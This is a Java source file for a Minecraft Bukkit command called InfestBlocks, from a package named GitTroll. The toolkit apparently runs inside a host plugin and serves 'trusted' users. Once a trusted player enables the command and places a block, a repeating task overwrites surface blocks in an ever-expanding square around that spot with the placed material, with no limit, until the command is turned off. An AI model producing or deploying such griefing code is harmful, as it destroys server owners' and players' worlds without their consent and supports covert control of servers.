package net.Lenni0451.GitTroll.command.commands.world;

import java.util.List;

import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockPlaceEvent;

import net.Lenni0451.GitTroll.GitTroll;
import net.Lenni0451.GitTroll.command.CommandBase;
import net.Lenni0451.GitTroll.utils.ArrayHelper;
import net.Lenni0451.GitTroll.utils.CustomPlayer;
import net.Lenni0451.GitTroll.utils.LocationUtils;

public class InfestBlocks extends CommandBase implements Listener {
	
	boolean enabled;
	Material infestMaterial;
	Location infestLocation;
	int range = 0;

	public InfestBlocks() {
		super("InfestBlocks", "Infest the world with a placed block");
		
		Bukkit.getScheduler().runTaskTimer(GitTroll.getInstance().getParentPlugin(), () -> {
			if(this.infestMaterial != null && this.infestLocation != null) {
				for(int x = -range; x <= range; x++) {
					for(int i = 0; i < 2; i++) {
						Location loc = this.infestLocation.clone().add(x, 0, (i == 0 ? range : -range));
						loc = LocationUtils.getHighestPoint(loc);
						loc.getBlock().setType(this.infestMaterial);
					}
				}
				for(int z = -range; z <= range; z++) {
					for(int i = 0; i < 2; i++) {
						Location loc = this.infestLocation.clone().add((i == 0 ? range : -range), 0, z);
						loc = LocationUtils.getHighestPoint(loc);
						loc.getBlock().setType(this.infestMaterial);
					}
				}
				range++;
			}
		}, 15, 15);
	}

	@Override
	public void execute(CustomPlayer executor, ArrayHelper args) {
		if(args.isEmpty()) {
			this.enabled = !this.enabled;
			if(this.enabled) {
				executor.sendGitMessage("§aPlace a block anywhere to infest the environment.");
			} else {
				executor.sendGitMessage("§cBlocks no longer spread.");
				this.infestLocation = null;
				this.infestMaterial = null;
				this.range = 0;
			}
		} else {
			this.commandWrong();
		}
	}

	@Override
	public void tabComplete(List<String> tabComplete, ArrayHelper args) {}
	
	@EventHandler
	public void onPlace(BlockPlaceEvent event) {
		if(!this.enabled) return;
		if(CustomPlayer.instanceOf(event.getPlayer()).isTrusted()) {
			this.infestMaterial = event.getBlock().getType();
			this.infestLocation = event.getBlock().getLocation();
			this.range = 0;
		}
	}

}
